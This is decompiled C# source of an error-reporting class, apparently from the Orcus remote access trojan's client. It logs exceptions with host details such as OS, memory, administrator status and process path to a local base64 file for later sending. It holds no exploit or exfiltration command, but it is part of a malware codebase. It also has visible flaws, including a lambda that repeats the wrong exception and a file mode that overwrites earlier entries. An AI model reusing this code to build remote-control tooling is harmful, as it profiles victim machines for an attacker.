using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Text;
using Orcus.Config;
using Orcus.Extensions;
using Orcus.Native;
using Orcus.Service;
using Orcus.Shared.Commands.ExceptionHandling;
using Orcus.Shared.NetSerializer;

namespace Orcus.Utilities;

internal class ErrorReporter
{
	private static ErrorReporter _instance;

	private readonly string _errorFile;

	private readonly object _fileLock = new object();

	public static ErrorReporter Current => _instance ?? (_instance = new ErrorReporter());

	public bool IsDataAvailable { get; private set; }

	public event EventHandler ExceptionsAvailable;

	private ErrorReporter()
	{
		_errorFile = Consts.ExceptionFile;
		IsDataAvailable = File.Exists(_errorFile);
	}

	private string GetExceptionStackTrace(Exception exception)
	{
		if (exception is ReflectionTypeLoadException)
		{
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine(exception.StackTrace);
			stringBuilder.AppendLine();
			stringBuilder.AppendLine();
			stringBuilder.AppendLine("LoaderExceptions:");
			stringBuilder.AppendLine();
			return (exception as ReflectionTypeLoadException).LoaderExceptions.Aggregate(stringBuilder, (StringBuilder builder, Exception exception1) => builder.AppendLine(exception.ToString() + "\r\n")).ToString();
		}
		return exception.StackTrace;
	}

	public void ReportError(Exception exception, string state)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_0061: Unknown result type (might be due to invalid IL or missing references)
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_0082: Unknown result type (might be due to invalid IL or missing references)
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a2: Expected O, but got Unknown
		//IL_00ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d4: Expected O, but got Unknown
		//IL_0138: Unknown result type (might be due to invalid IL or missing references)
		//IL_013e: Expected O, but got Unknown
		ExceptionInfo val = new ExceptionInfo();
		val.set_Message(exception.Message);
		val.set_StackTrace(GetExceptionStackTrace(exception));
		val.set_ErrorType(exception.GetType().ToString());
		val.set_Timestamp(DateTime.UtcNow);
		val.set_ProcessMemory(GC.GetTotalMemory(forceFullCollection: true));
		val.set_IsServiceRunning(ServiceConnection.Current.IsConnected);
		val.set_IsAdministrator(User.IsAdministrator);
		val.set_ProcessPath(Consts.ApplicationPath);
		val.set_Is64BitSystem(EnvironmentExtensions.Is64BitOperatingSystem);
		val.set_Is64BitProcess(EnvironmentExtensions.Is64BitProcess);
		val.set_RuntimeVersion(Environment.Version.ToString());
		val.set_State(state);
		val.set_ClientVersion(19);
		ExceptionInfo val2 = val;
		MEMORYSTATUSEX mEMORYSTATUSEX = new MEMORYSTATUSEX();
		if (NativeMethods.GlobalMemoryStatusEx(mEMORYSTATUSEX))
		{
			val2.set_TotalMemory(mEMORYSTATUSEX.ullTotalPhys);
			val2.set_AvailableMemory(mEMORYSTATUSEX.ullAvailPhys);
		}
		try
		{
			ManagementObjectSearcher val3 = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem");
			try
			{
				ManagementObject? obj = ((IEnumerable)val3.Get()).OfType<ManagementObject>().FirstOrDefault();
				val2.set_OsName((obj != null) ? ((ManagementBaseObject)obj).get_Item("Caption").ToString() : null);
			}
			finally
			{
				((IDisposable)val3)?.Dispose();
			}
		}
		catch (Exception)
		{
		}
		if (string.IsNullOrEmpty(val2.get_OsName()))
		{
			val2.set_OsName(Environment.OSVersion.ToString());
		}
		Serializer val4 = new Serializer(typeof(List<ExceptionInfo>));
		Directory.CreateDirectory(Path.GetDirectoryName(_errorFile));
		lock (_fileLock)
		{
			using FileStream stream = new FileStream(_errorFile, FileMode.OpenOrCreate, FileAccess.Write);
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.WriteLine(Convert.ToBase64String(val4.Serialize((object)val2)));
		}
		IsDataAvailable = true;
		this.ExceptionsAvailable?.Invoke(this, EventArgs.Empty);
	}

	public List<ExceptionInfo> GetData()
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Expected O, but got Unknown
		if (!File.Exists(_errorFile))
		{
			return null;
		}
		List<ExceptionInfo> list = new List<ExceptionInfo>();
		Serializer val = new Serializer(typeof(List<ExceptionInfo>));
		lock (_fileLock)
		{
			using FileStream stream = new FileStream(_errorFile, FileMode.Open, FileAccess.Read);
			using StreamReader streamReader = new StreamReader(stream);
			while (!streamReader.EndOfStream)
			{
				string text = streamReader.ReadLine();
				if (!string.IsNullOrEmpty(text))
				{
					try
					{
						list.Add(val.Deserialize<ExceptionInfo>(Convert.FromBase64String(text), 0));
					}
					catch (Exception)
					{
					}
				}
			}
			return list;
		}
	}

	public void ExceptionSent()
	{
		FileInfo fileInfo = new FileInfo(_errorFile);
		if (fileInfo.Exists)
		{
			lock (_errorFile)
			{
				fileInfo.Delete();
			}
		}
		IsDataAvailable = false;
	}
}
